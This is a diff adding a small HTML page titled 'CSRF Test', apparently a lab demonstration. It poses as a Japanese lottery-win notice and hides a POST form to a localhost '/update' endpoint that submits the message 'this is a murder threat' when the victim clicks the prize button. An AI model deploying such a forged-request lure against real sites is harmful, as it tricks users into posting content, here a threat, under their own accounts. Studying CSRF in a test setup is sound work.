@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Test</title>
+</head>
+<body>
+  <h1>ハッピー宝くじ当選のお知らせです。</h1>
+  <p>厳正なる抽選の結果あなたに１億円の賞金が与えられることになりました。ボタンを押して受け取りの手続きをお願いします。</p>
+  <form action="http://localhost:3000/update" method="POST">
+    <input type="hidden" name="message" value="殺害予告です"/>
+    <button type="submit">押すと１億円もらえる！</button>
+  </form>
+</body>
+</html>
